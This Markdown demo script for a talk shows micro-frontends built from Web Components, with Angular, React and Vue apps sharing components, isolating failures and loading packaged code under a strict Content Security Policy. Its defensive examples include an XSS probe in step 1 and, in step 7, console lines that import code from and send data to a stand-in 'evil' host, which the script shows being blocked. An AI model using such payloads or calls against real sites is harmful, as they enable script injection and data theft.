# Demo script

Seven steps, from "it's just the browser" to four frameworks on one page, ending with the
safest way to ship components. Start everything first with `docker compose up --build --watch`,
and restore the seed data afterwards with `docker compose up -d --force-recreate mock-api`.

## 1. It's just the browser

**Open** `http://localhost:4100` (`examples/web-components-basics`).

- Type a new name: `<user-card>` updates through an attribute and `attributeChangedCallback`.
- Click the counter: the page hears the `count-changed` event.
- Click "Add Milk from the page": the page calls the component's public method.
- Type `<img src=x onerror=alert(1)>` as the name: it shows as text. `textContent` cannot run code.

**Message:** Web Components are a browser standard. No framework, no build.

## 2. One design system for everyone

**Open** `http://localhost:4300` (the `@shop/ui` demo page).

- Four components: `ui-button`, `ui-card`, `ui-badge`, `ui-data-table`.
- Every app that follows renders with these same tags.

**Message:** write a design system once; every framework can use it.

## 3. Any framework hosts any other

**Open** `http://localhost:4500/orders` (`backoffice-angular16`).

- Click "Open" in the **Vue** status filter: the **Angular** list filters, the **React** feed logs it.
- Click a **React** stat tile: the **Vue** filter follows.
- Click an order in the **Angular** list: the URL changes, the detail and the **Vue** notes load.
- Add a note in **Vue**: it appears in the **React** feed.
- Mark the order as shipped in **Angular**: the **React** counts update.

**Message:** components talk through events up and attributes or properties down.
None of them imports another framework.

## 4. Versions don't matter

In the browser console:

```js
document.querySelector('app-root').getAttribute('ng-version');         // 16.x: the host
document.querySelector('shop-orders-list').getAttribute('ng-version'); // the current Angular
```

**Message:** Angular 16 and a current Angular run side by side. Teams upgrade on their own schedule.

## 5. Same remotes, different host

**Open** `http://localhost:4400/orders` (`backoffice-vue`) and `http://localhost:4200/orders`
(`backoffice-react`).

- The same Angular, React and Vue components, unchanged, with no rebuild.
- Each host paints everything in its own colour: Vue green, React blue, Angular red.
  In `backoffice-react`, change the theme in Settings and watch the Angular list recolour.

**Message:** the host decides the theme and the layout; the remotes don't care who hosts them.

## 6. Independent and resilient

Run `docker compose stop orders` and reload `http://localhost:4500/orders`.

- Only the Orders card shows an error; the Vue and React parts keep working.
- Run `docker compose start orders` and click Retry.

**Message:** one team's outage never takes down the page. Each app deploys on its own.

## 7. The safe way: a package, no remote code

**Open** `http://localhost:4600` (`backoffice-vanilla`). Keep the Orders server stopped.

- The same Angular list and detail on a page with **no framework**: open `app.js` and show
  `querySelector`, `setAttribute`, `addEventListener`.
- DevTools, Network tab: every script comes from `localhost:4600`. The Angular code was installed
  as `@shop/orders-elements`, and its hash is in `package-lock.json`.
- In the console, try to reach another server:

  ```js
  import('https://example.com/evil.js'); // blocked by script-src 'self'
  fetch('https://example.com/steal');    // blocked by connect-src
  ```

**Then the same in a framework.** Restart `backoffice-react` with the Orders source switched
from the remote server to the installed package, and open `http://localhost:4200/orders` with
the Network tab open:

- Remote: the Angular code comes from `localhost:4201` the first time `/orders` opens.
- Package: the same code comes from `localhost:4200`, still only when `/orders` first opens.
  It is lazy loaded from the app's own origin, and the Orders server can stay stopped.

**Message:** runtime remotes give independent deployments; an installed package gives control.

## Closing slide

| Layer | Technology |
| --- | --- |
| Contract | Custom elements: attributes, properties, `CustomEvent`s |
| Styling | Shadow DOM plus CSS custom properties (`--shop-*`) |
| Loading | Native Federation (Angular), plain ESM `import()` (React, Vue), or an installed package |
| Safety | `textContent` everywhere, isolated failures per remote, strict CSP with packaged components |
